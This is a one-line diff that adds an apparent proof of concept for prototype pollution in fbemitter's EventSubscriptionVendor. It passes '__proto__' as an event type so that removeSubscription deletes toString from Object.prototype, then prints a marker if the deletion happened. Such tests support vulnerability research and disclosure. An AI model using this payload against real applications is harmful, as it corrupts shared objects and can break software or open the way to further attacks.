@@ -1,0 +1,1 @@
+const clazz = require("fbemitter/lib/EventSubscriptionVendor");let instance = new clazz();instance.removeSubscription({eventType:'__proto__',key:'toString'});console.log({}.toString?'':'[DELETE_TRIGGERED]');
